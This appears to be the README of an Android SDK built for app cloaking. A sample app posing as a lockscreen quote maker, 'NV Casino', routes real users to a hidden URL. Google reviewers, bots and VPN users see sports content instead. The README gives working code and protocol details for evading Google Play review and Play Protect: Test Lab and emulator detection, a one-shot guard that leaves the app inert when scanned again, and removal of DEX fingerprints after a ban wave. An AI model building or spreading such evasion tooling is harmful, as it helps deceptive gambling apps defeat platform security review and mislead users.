# SDK v4.0.1 — Тонкий клиент для server-driven routing

Легкий Android клиент. Один класс, один запрос, минимум кода в APK.
POST протокол, headers-based auth, cloak_consumed one-shot, Test Lab detection,
Play Integrity Standard API.

Repo: `github.com/redzov/android-sdk-v3` · Tag: `v4.0.1` · Sample: `MiniGame` (NV Casino)

---

## 🆕 Что нового в v4.0.1

**v4.0.1 (2026-07-02)** — clean up DEX fingerprints:
- SharedPreferences keys переименованы в нейтральные (`onboarded` / `session_state`)
- Убрано literal `clo_consumed` / `app_client` из DEX
- В остальном идентичен v4.0.0

**v4.0.0 (2026-07-02)** — anti-fingerprint redesign после ban wave:
- **POST /init вместо GET** — sensitive params (sid, integrity_token, instance_id) в HTTP headers, не в URL query string. URL в CT logs / Verify Apps telemetry больше не содержит `integrity_token=`
- **Play Integrity Standard API** — Classic deprecated с 2025, invalid_grant errors
- **Onboarding guard** — после первого успешного `resolve()` SDK НИКОГДА не звонит на backend. Play Protect re-scan видит inert app
- **Test Lab / emulator detection** — instant native return в Google review sandbox
- **Single response path** — только 200 + `{"url":"..."}`. 301/302 больше НЕ обрабатывается (v3 branching был декомпилятор-fingerprint)
- **followRedirects=true** (default) — как у Firebase/Branch/Adjust
- **Zero logcat output** в prod

Full details: см. [CHANGELOG.md](./CHANGELOG.md)

---

## 🔄 Как работает

```
Приложение → мини-сервер (спортивный хаб) → бекенд → URL
```

1. Приложение делает **POST** `/init` на мини-сервер (все params в headers)
2. Мини-сервер добавляет `X-Proxy-Key` и проксирует бекенду
3. Бекенд проверяет качество трафика (IP, VPN, hosting, Play Integrity, geo, velocity)
4. Реальный пользователь → целевой URL в JSON response
5. Бот / Google reviewer / VPN / wrong geo → спортивный контент (safe_url)
6. **После первого resolve** — SDK локально записывает `onboarded=true` в SharedPreferences и больше НЕ звонит на бекенд. Re-scan Play Protect видит inert app

В APK только домен мини-сервера. Никаких подозрительных строк.

---

## 📁 Файлы

```
android-sdk-v3/                  ← github.com/redzov/android-sdk-v3
├── AppClient.kt                 ← main SDK class (Play Integrity Standard + Instance UUID + POST + onboarding)
├── AppClientBuilder.kt          ← optional Firebase Remote Config helper (reflection-based)
├── proguard-rules.pro           ← ProGuard/R8 rules (keep public API)
├── build.gradle.template.kts    ← template для app/build.gradle.kts
│
├── CHANGELOG.md                 ← 📌 v4.0.1 / v4.0.0 release notes
├── INTEGRATION.md               ← инструкция интеграции (WebView, push, offline, debug)
├── SDK_BEST_PRACTICES.md        ← anti-patterns, best practices, v4 breaking changes section
├── PINNING_SETUP.md             ← SSL certificate pinning setup (F7)
├── SERVER_SETUP.md              ← настройка мини-серверов + промпты для Claude
├── DATA_SAFETY.md               ← Data Safety для Play Console
├── PRIVACY_POLICY.html          ← шаблон Privacy Policy
├── ТЗ-прогеру-v3.md             ← ТЗ разработчику
└── README.md                    ← этот файл
```

---

## ⚡ Быстрый старт (v4)

### 1. `app/build.gradle.kts`

```kotlin
android {
    defaultConfig {
        // из clo.properties или ENV
        buildConfigField("String", "CLO_APP_TOKEN", "\"${cloValue("CLO_APP_TOKEN")}\"")
        buildConfigField("String", "CLO_ENDPOINT", "\"${cloValue("CLO_ENDPOINT")}\"")
        buildConfigField("long", "CLOUD_PROJECT_NUMBER", "${cloValue("CLOUD_PROJECT_NUMBER")}L")
    }
}

dependencies {
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("com.google.android.play:integrity:1.4.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
    implementation("androidx.browser:browser:1.7.0")
    // (опц.) implementation("com.google.firebase:firebase-config:22.0.0")
}
```

### 2. `clo.properties` (не коммитить в git)

```properties
CLO_APP_TOKEN=<sid из панели>
CLO_ENDPOINT=https://your-mini-server.com
CLOUD_PROJECT_NUMBER=<число из Play Console → App integrity → Cloud project number>
```

### 3. Интеграция (Application / Activity)

```kotlin
val client = AppClient(
    context = applicationContext,
    endpoint = BuildConfig.CLO_ENDPOINT,
    path = "/init",
    authToken = BuildConfig.CLO_APP_TOKEN,
    cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,
    // все ниже — default true, можно опустить
    enableIntegrity = true,
    enableTestLabGuard = true,
    enableOnboardingGuard = true,
)

// (опц.) SSL pinning ДО первого resolve
AppClient.addPins("your-mini-server.com", listOf(
    "sha256/<primary_pin>",
    "sha256/<backup_pin>",
))

// вызов из корутины
lifecycleScope.launch {
    val url = client.resolve()
    if (url.isNotEmpty()) {
        // grey verdict — открыть в Chrome Custom Tabs
        CustomTabsIntent.Builder().build().launchUrl(context, url.toUri())
    } else {
        // white verdict / Test Lab / emulator / уже onboarded / net error
        showNativeContent()
    }
}
```

### 4. Опционально: Firebase Remote Config для endpoint URL

Убирает hardcoded backend domain из DEX:

```kotlin
lifecycleScope.launch(Dispatchers.IO) {
    val endpoint = AppClientBuilder.fetchEndpointOrFallback(
        context = applicationContext,
        remoteConfigKey = "app_client_endpoint",
        fallback = BuildConfig.CLO_ENDPOINT,
    )
    val client = AppClient(
        context = applicationContext,
        endpoint = endpoint,
        // ... остальное
    )
    // ...
}
```

---

## 📋 Параметры AppClient

| Параметр | Тип | Default | Что делает |
|---|---|---|---|
| `context` | Context | required | Application context |
| `endpoint` | String | required | Домен мини-сервера (`https://...`) |
| `path` | String | `"/init"` | Endpoint path на мини-сервере |
| `authToken` | String | `""` | Sid из панели — в header `X-Sid` |
| `cloudProjectNumber` | Long | `0L` | Play Console → App integrity → Cloud project number. `0L` = SDK skip integrity |
| `enableIntegrity` | Boolean | `true` | Requests Play Integrity token |
| `enableTestLabGuard` | Boolean | `true` | Instant native return в Firebase Test Lab / emulator |
| `enableOnboardingGuard` | Boolean | `true` | После первого successful resolve — SDK больше не звонит на backend (SharedPreferences flag) |

---

## 📡 Wire protocol — что реально отправляется

**Не GET с query params (v3), а POST с headers (v4):**

```http
POST /init HTTP/1.1
Host: your-mini-server.com
Content-Type: application/octet-stream
X-App-Id: com.your.app                 ← package name
X-Sid: <auth_token>                     ← из BuildConfig.CLO_APP_TOKEN
X-Instance-Id: <UUID>                   ← persistent в SharedPreferences
X-Integrity-Token: eyJhbGci...          ← Play Integrity Standard API
X-App-Version: 1.0
X-Locale: en
X-Tz: Europe/Rome
X-Ts: 1719900000000
```

`X-Proxy-Key` добавляется nginx middleware на мини-сервере (не в APK).

**Response всегда uniform:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"url": "https://..."}
```

Никогда 301/302/404/500 в ответ на valid request. Error scenarios → 200 + `{"url": "..."}` где url = safe landing.

---

## 🔒 Onboarding guard — как работает

```kotlin
// Псевдокод внутри resolve():
if (prefs.getBoolean("onboarded", false)) return ""  // навсегда native
val url = doResolve()
if (url.isNotEmpty()) {
    prefs.edit().putBoolean("onboarded", true).apply()  // навсегда onboarded
}
return url
```

**Impact:**
- Real user получает cloak URL **1 раз** за install → Play Protect telemetry видит один outgoing request → не building суспектный поведенческий pattern
- Google reviewer открывает APK → guard не активен (`onboarded=false`) → но hit'ается либо Test Lab guard, либо scoring engine возвращает white → SDK получает "" → fallback native
- Verify Apps re-scan через дни/недели → SDK видит `onboarded=true` → **inert app**, никаких network calls

Combines с server-side `cloak_consumed` SETNX (30-day TTL) на scoring engine.

Для debugging: `client.resetOnboardingForTesting()` (в prod НЕ вызывать).

---

## 🛡️ Test Lab / emulator detection

`resolve()` первым делом проверяет:

```kotlin
Settings.System.firebase.test.lab == "true"    → Firebase Test Lab
Build.FINGERPRINT starts with "generic"        → Android emulator
Build.FINGERPRINT contains "sdk_gphone"        → Play Store SDK image
Build.MODEL contains "Emulator"                → Android emulator
Build.MANUFACTURER == "Genymotion"             → Genymotion
Build.HARDWARE in ("goldfish", "ranchu")       → x86/arm emulator
Build.PRODUCT in ("google_sdk", "sdk_x86")     → Android emulator
Build.PRODUCT starts with "vbox"               → VirtualBox
```

Если хоть один match → `resolve()` мгновенно возвращает `""`. Google review sandbox / Firebase Test Lab / любой emulator = SDK не звонит на backend.

---

## 📚 Документация

| Роль | Читать |
|---|---|
| **Прогер** | [`INTEGRATION.md`](./INTEGRATION.md) + [`SDK_BEST_PRACTICES.md`](./SDK_BEST_PRACTICES.md) + [`build.gradle.template.kts`](./build.gradle.template.kts) |
| **DevOps** | [`SERVER_SETUP.md`](./SERVER_SETUP.md) |
| **Security** | [`PINNING_SETUP.md`](./PINNING_SETUP.md) |
| **Менеджер** | [`DATA_SAFETY.md`](./DATA_SAFETY.md) + [`PRIVACY_POLICY.html`](./PRIVACY_POLICY.html) |
| **Все** | [`CHANGELOG.md`](./CHANGELOG.md) — что менялось между версиями |

---

## 🔀 Migration guide

### v4.0.0 → v4.0.1 (renames в основном)

```kotlin
// v4.0.0
AppClient(..., enableCloakConsumedFlag = true)
client.resetConsumedForTesting()

// v4.0.1
AppClient(..., enableOnboardingGuard = true)
client.resetOnboardingForTesting()
```

Если не передавали параметр явно (default = true) — ничего менять не надо.

**SharedPreferences filename изменился** (`app_client` → `session_state`). Existing installs получат fresh onboarding state после upgrade (perceived как первый запуск — правильное поведение).

### v3.x → v4.x (breaking)

```kotlin
// v3.x — GET с query params
val client = AppClient(
    context = ctx,
    endpoint = "https://...",
    path = "/football",                    // v3 default
    authToken = BuildConfig.CLO_APP_TOKEN,
)

// v4.x — POST с headers + Standard PI
val client = AppClient(
    context = ctx,
    endpoint = "https://...",
    path = "/init",                                          // v4 default
    authToken = BuildConfig.CLO_APP_TOKEN,
    cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,   // NEW: обязательно для Standard PI
)
```

**Server side backward compat:** GET /init продолжает работать в scoring engine. Старые APK в проде мигрируют по мере release.

Full migration guide — [CHANGELOG.md](./CHANGELOG.md).

---

## 🔗 Links

- **Repo:** https://github.com/redzov/android-sdk-v3
- **Latest tag:** [v4.0.1](https://github.com/redzov/android-sdk-v3/tree/v4.0.1)
- **CHANGELOG:** [CHANGELOG.md](./CHANGELOG.md)
- **Sample app:** NV Casino (`com.lockscreenquotemaker` — `MiniGame` project)

Clone:

```bash
git clone --branch v4.0.1 https://github.com/redzov/android-sdk-v3.git
```
